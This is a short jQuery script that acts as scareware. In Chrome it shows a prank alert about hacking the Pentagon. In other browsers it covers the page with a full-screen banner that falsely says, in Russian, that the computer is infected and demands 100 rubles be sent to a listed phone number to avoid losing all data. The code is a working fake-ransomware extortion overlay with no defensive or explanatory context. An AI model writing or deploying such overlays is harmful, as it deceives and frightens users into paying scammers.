var cleaning = function (ans) {
  if (ans=="yes") $("#test").remove();
}
var Userbrowser = navigator.userAgent.search(/Chrome/i);
if(Userbrowser > 0) alert ("It`s good day for hacking The Pentagon!!!\nMy russian hacker.");
else {
  $("head").append('<style>html,body{margin:0px;}.banner{ width:60%;height:60%;position:fixed;right:18%;top:15%;background:red;color:white;text-align:center;padding:10px;box-shadow:0 0 20px rgba(0, 0, 0, 0.51);}.shadow{position:fixed;top:0;left:0;width:100%;height:100%;background-color:#626262;}</style>');
  $("body").append('<div id="test"></div>');
  $("#test").append('<div id="advertising"></div>');
  $("#test").append('<div id="shadow" class="shadow"></div>');
  $("#test").append('<div id="baner" class="banner"><h2>Ваш компьютер заражен</h2><h3>Чтобы не потерять все данные отправте 100 рублей на номер:</h3><h3>+7-495-673-78-43</h3></div>')
}
